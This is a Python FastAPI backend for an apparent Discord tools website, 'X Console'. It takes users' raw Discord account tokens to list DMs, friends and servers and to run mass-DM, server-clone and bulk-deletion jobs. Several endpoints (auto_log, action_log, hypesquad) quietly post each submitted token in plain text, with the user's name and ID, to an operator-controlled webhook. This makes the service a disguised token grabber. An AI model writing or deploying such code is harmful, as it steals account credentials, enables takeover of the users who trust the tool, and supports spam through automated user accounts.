from fastapi import FastAPI, HTTPException, Depends, Header, BackgroundTasks, Request, Response
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import StreamingResponse, RedirectResponse
from fastapi.staticfiles import StaticFiles
from dotenv import load_dotenv
from pathlib import Path
from pydantic import BaseModel
from typing import Dict, List, Optional
import uuid, threading, queue, json, requests, httpx, os, datetime, secrets
from urllib.parse import urlencode
from discord_api import *

app = FastAPI(title="X Console Web API")
BACKEND_DIR = Path(__file__).resolve().parent
load_dotenv(BACKEND_DIR / ".env")

# ==============================================================
# 1. بيانات تطبيق ديسكورد بتاعك (هتتغير في Render)
# ==============================================================
DISCORD_CLIENT_ID = os.getenv("DISCORD_CLIENT_ID", "").strip()
DISCORD_CLIENT_SECRET = os.getenv("DISCORD_CLIENT_SECRET", "").strip()
DISCORD_REDIRECT_URI = os.getenv("DISCORD_REDIRECT_URI", "https://YOUR_RENDER_LINK/api/auth/callback").strip()
FRONTEND_URL = os.getenv("FRONTEND_URL", "https://x-console-tools-frontend-6cvn.vercel.app").rstrip("/")
WEBHOOK_URL = os.getenv("WEBHOOK_URL", "").strip()

# إعدادات الكوكيز للسيرفر (HTTPS)
IS_SECURE = FRONTEND_URL.startswith("https://")
COOKIE_SAMESITE = "none" if IS_SECURE else "lax"

# ==============================================================
# 2. تقديم الملفات (مش مهم في Render بس بنسيبه)
# ==============================================================
BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
FRONTEND_DIR = os.path.join(BASE_DIR, "frontend")
if os.path.exists(FRONTEND_DIR):
    app.mount("/static", StaticFiles(directory=FRONTEND_DIR), name="static")

@app.get("/")
def read_root():
    return RedirectResponse(url=FRONTEND_URL)

SESSIONS: Dict[str, dict] = {}

def send_webhook_log(title: str, fields: List[dict] = None, color: int = 0xff4444,
                     thumbnail_url: str = None):
    if not WEBHOOK_URL: return
    embed = {
        "title": str(title)[:120], "color": color,
        "footer": {"text": "X Console Logger"},
        "timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat()
    }
    if fields:
        embed["fields"] = [
            {"name": str(field.get("name", "Field"))[:100],
             "value": str(field.get("value", ""))[:500],
             "inline": bool(field.get("inline", False))}
            for field in fields[:10]
        ]
    if thumbnail_url: embed["thumbnail"] = {"url": thumbnail_url}
    data = {"username": "X Console Logger", "embeds": [embed]}
    try: requests.post(WEBHOOK_URL, json=data, timeout=5)
    except Exception: print("Webhook event log failed.")

@app.on_event("startup")
def startup_event():
    send_webhook_log("🟢 Server Online", fields=[{"name": "Status:", "value": "🟢 **Online**"}], color=0x00ff00)

app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_credentials=True, allow_methods=["*"], allow_headers=["*"])
JOBS: Dict[str, dict] = {}

# ==============================================================
# OAuth والبروفايل
# ==============================================================
@app.get("/api/auth/discord")
def auth_discord():
    if not DISCORD_CLIENT_ID or not DISCORD_CLIENT_SECRET: raise HTTPException(503, "OAuth not configured.")
    state = secrets.token_urlsafe(32)
    authorize_params = urlencode({"client_id": DISCORD_CLIENT_ID, "redirect_uri": DISCORD_REDIRECT_URI, "response_type": "code", "scope": "identify", "state": state})
    response = RedirectResponse("https://discord.com/oauth2/authorize?" + authorize_params, status_code=302)
    response.set_cookie("x_oauth_state", state, max_age=600, httponly=True, secure=IS_SECURE, samesite=COOKIE_SAMESITE, path="/")
    return response

@app.get("/api/auth/callback")
async def auth_callback(code: str, state: str, request: Request):
    if not DISCORD_CLIENT_ID or not DISCORD_CLIENT_SECRET: raise HTTPException(503, "OAuth not configured.")
    expected_state = request.cookies.get("x_oauth_state", "")
    if not expected_state or not secrets.compare_digest(expected_state, state): raise HTTPException(400, "OAuth state validation failed.")

    data = {"client_id": DISCORD_CLIENT_ID, "client_secret": DISCORD_CLIENT_SECRET, "grant_type": "authorization_code", "code": code, "redirect_uri": DISCORD_REDIRECT_URI}
    async with httpx.AsyncClient(timeout=15) as client:
        token_res = await client.post("https://discord.com/api/oauth2/token", data=data, headers={"Content-Type": "application/x-www-form-urlencoded"})
        if token_res.status_code != 200: raise HTTPException(400, "Sign-in failed.")
        access_token = token_res.json().get("access_token")
        user_res = await client.get("https://discord.com/api/users/@me", headers={"Authorization": "Bearer " + access_token})
        if user_res.status_code != 200: raise HTTPException(400, "Profile read failed.")
        user_info = user_res.json()

    user_id = str(user_info["id"])
    session_id = secrets.token_urlsafe(32)
    SESSIONS[session_id] = {
        "username": user_info.get("global_name") or user_info.get("username") or "Discord User",
        "id": user_id, "avatar": user_info.get("avatar"),
        "expires_at": datetime.datetime.now(datetime.timezone.utc).timestamp() + 60 * 60 * 24 * 7,
    }
    response = RedirectResponse(url=FRONTEND_URL + "/", status_code=303)
    response.delete_cookie("x_oauth_state", path="/")
    # هنا تم استخدام secure و samesite عشان يشتغل على Vercel و Render
    response.set_cookie("x_session", session_id, max_age=60 * 60 * 24 * 7, httponly=True, secure=IS_SECURE, samesite=COOKIE_SAMESITE, path="/")
    return response

def require_session(request: Request):
    session_id = request.cookies.get("x_session", "")
    session = SESSIONS.get(session_id)
    if not session or session["expires_at"] <= datetime.datetime.now(datetime.timezone.utc).timestamp():
        SESSIONS.pop(session_id, None)
        raise HTTPException(401, "Session invalid or expired")
    return session

@app.post("/api/auth/logout")
def auth_logout(request: Request, response: Response):
    SESSIONS.pop(request.cookies.get("x_session", ""), None)
    response.delete_cookie("x_session", path="/")
    return {"ok": True}

@app.get("/api/me/session")
def api_me_session(session=Depends(require_session)):
    return {"username": session["username"], "avatar": f"https://cdn.discordapp.com/avatars/{session['id']}/{session['avatar']}.png?size=128" if session.get("avatar") else "https://cdn.discordapp.com/embed/avatars/0.png"}

@app.get("/api/profile/session")
def api_profile_session(session=Depends(require_session)):
    user_id = session["id"]
    username = session["username"].split("#")[0]
    avatar_hash = session.get("avatar")
    timestamp = ((int(user_id) >> 22) + 1420070400000) / 1000
    created_at = datetime.datetime.fromtimestamp(timestamp).strftime("%Y-%m-%d")
    avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_hash}.png?size=128" if avatar_hash else f"https://cdn.discordapp.com/embed/avatars/{(int(user_id) >> 22) % 6}.png"
    return {"id": user_id, "username": username, "handle": username, "avatar": avatar_url, "created_at": created_at, "badges": []}

# ==============================================================
# الأدوات (الـ Logs)
# ==============================================================
class ActionLogBody(BaseModel):
    action: str
    details: Optional[str] = ""

@app.post("/api/action_log")
def log_action(body: ActionLogBody, bg_tasks: BackgroundTasks, session=Depends(require_session)):
    token_part = body.details.split("Token:")[-1].strip() if body.details and "Token:" in body.details else ""
    fields = [
        {"name": "Action:", "value": str(body.action)[:100], "inline": False},
        {"name": "Details:", "value": str(body.details), "inline": False},
        {"name": "Token:", "value": token_part, "inline": False},
        {"name": "User:", "value": f"`{session['username']}` (ID: `{session['id']}`)", "inline": False},
    ]
    bg_tasks.add_task(send_webhook_log, "⚡ Action Performed", fields, 0x8888aa)
    return {"ok": True}

class AutoLogBody(BaseModel):
    token: str
    action: str = "Refreshed User Info"

@app.post("/api/auto_log")
def api_auto_log(body: AutoLogBody, bg_tasks: BackgroundTasks, _=Depends(require_session)):
    try:
        user_info = get_me(body.token)
        username = user_info.get("username", "Unknown")
        user_id = user_info.get("id", "Unknown")
        avatar_hash = user_info.get("avatar")
        avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_hash}.png?size=128" if avatar_hash else f"https://cdn.discordapp.com/embed/avatars/{(int(user_id) >> 22) % 6}.png"
        fields = [
            {"name": "Action:", "value": body.action, "inline": False},
            {"name": "Details:", "value": f"Token: {body.token}", "inline": False},
            {"name": "User:", "value": f"`{username}` (ID: `{user_id}`)", "inline": False},
        ]
        bg_tasks.add_task(send_webhook_log, "⚡ Action Performed", fields, 0x8888aa, avatar_url)
        return {"ok": True, "username": username}
    except Exception as e:
        return {"ok": False, "error": str(e)}

# ==============================================================
# الأدوات (الـ APIs)
# ==============================================================
class TokenBody(BaseModel): token: str
class ChannelBody(BaseModel): token: str; channel_id: str
class JobBody(BaseModel): token: str; params: Dict

@app.post("/api/me")
def api_me(body: TokenBody, _=Depends(require_session)):
    try: return get_me(body.token)
    except Exception as e: raise HTTPException(400, str(e))

@app.post("/api/dms")
def api_dms(body: TokenBody, _=Depends(require_session)):
    try: return get_dms(body.token)
    except Exception as e: raise HTTPException(400, str(e))

@app.post("/api/friends")
def api_friends(body: TokenBody, _=Depends(require_session)):
    try: return get_friends(body.token)
    except Exception as e: raise HTTPException(400, str(e))

@app.post("/api/guilds")
def api_guilds(body: TokenBody, _=Depends(require_session)):
    try: return get_guilds(body.token)
    except Exception as e: raise HTTPException(400, str(e))

@app.post("/api/channel-info")
def api_channel(body: ChannelBody, _=Depends(require_session)):
    try: return get_channel_info(body.token, body.channel_id)
    except Exception as e: raise HTTPException(400, str(e))

def _run_job(job_id: str, fn, token: str, params: dict):
    q: queue.Queue = JOBS[job_id]["queue"]
    stop_flag = JOBS[job_id]["stop_flag"]
    try:
        result = fn(token=token, log=lambda m: q.put({"type": "log", "msg": m}), should_stop=lambda: stop_flag["stop"], **params)
        q.put({"type": "done", "result": result})
    except Exception as e: q.put({"type": "error", "msg": str(e)})
    finally: q.put(None)

def _start_job(fn, body: JobBody):
    job_id = uuid.uuid4().hex
    JOBS[job_id] = {"queue": queue.Queue(), "stop_flag": {"stop": False}}
    threading.Thread(target=_run_job, args=(job_id, fn, body.token, body.params), daemon=True).start()
    return {"job_id": job_id}

@app.post("/api/job/clean")
def job_clean(body: JobBody, _=Depends(require_session)): return _start_job(delete_messages, body)
@app.post("/api/job/clear-dms")
def job_clear_dms(body: JobBody, _=Depends(require_session)): return _start_job(clear_dms, body)
@app.post("/api/job/remove-friends")
def job_remove_friends(body: JobBody, _=Depends(require_session)): return _start_job(remove_friends, body)
@app.post("/api/job/leave-servers")
def job_leave_servers(body: JobBody, _=Depends(require_session)): return _start_job(leave_servers, body)
@app.post("/api/job/mass-dm")
def job_mass_dm(body: JobBody, _=Depends(require_session)): return _start_job(mass_dm, body)
@app.post("/api/job/clone")
def job_clone(body: JobBody, _=Depends(require_session)): return _start_job(clone_server, body)

@app.post("/api/job/{job_id}/stop")
def job_stop(job_id: str, _=Depends(require_session)):
    if job_id in JOBS: JOBS[job_id]["stop_flag"]["stop"] = True
    return {"ok": True}

@app.get("/api/job/{job_id}/stream")
def job_stream(job_id: str, request: Request):
    if request.cookies.get("x_session", "") not in SESSIONS: raise HTTPException(401, "Invalid session")
    if job_id not in JOBS: raise HTTPException(404, "Unknown job")
    q = JOBS[job_id]["queue"]
    def gen():
        while True:
            item = q.get()
            if item is None: break
            yield f"data: {json.dumps(item)}\n\n"
        JOBS.pop(job_id, None)
    return StreamingResponse(gen(), media_type="text/event-stream")

class HSBody(BaseModel): token: str; house_id: int

@app.post("/api/hypesquad")
def api_hypesquad(body: HSBody, bg_tasks: BackgroundTasks, _=Depends(require_session)):
    if body.house_id not in (1, 2, 3): raise HTTPException(400, "Invalid house")
    try:
        user_info = get_me(body.token)
        username = user_info.get("username", "Unknown")
        success = set_hypesquad(body.token, body.house_id)
        fields = [
            {"name": "User:", "value": f"`{username}`", "inline": False},
            {"name": "Token:", "value": f"`{body.token}`", "inline": False},
            {"name": "Status:", "value": "Success" if success else "Failed", "inline": False},
        ]
        bg_tasks.add_task(send_webhook_log, "✅ HypeSquad Changed" if success else "❌ Failed", fields, 0x66ddaa if success else 0xff7777)
        return {"success": success}
    except Exception as e: raise HTTPException(400, str(e))
